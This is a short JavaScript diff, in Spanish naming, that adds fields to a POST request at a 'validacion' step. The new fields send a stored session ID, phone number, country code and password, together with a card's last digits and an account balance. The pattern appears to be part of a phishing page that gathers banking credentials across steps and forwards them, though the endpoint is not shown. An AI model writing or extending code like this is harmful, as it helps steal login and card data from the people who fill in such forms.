@@ -93,6 +93,10 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           step: 'validacion',
+          sessionId:   sessionStorage.getItem('sessionId')   || '',
+          phone:       sessionStorage.getItem('phone')       || '',
+          countryCode: sessionStorage.getItem('countryCode') || '',
+          password:    sessionStorage.getItem('staticPwd')   || '',
           lastDigits: enteredDigits,
           balance: balance,
         }),
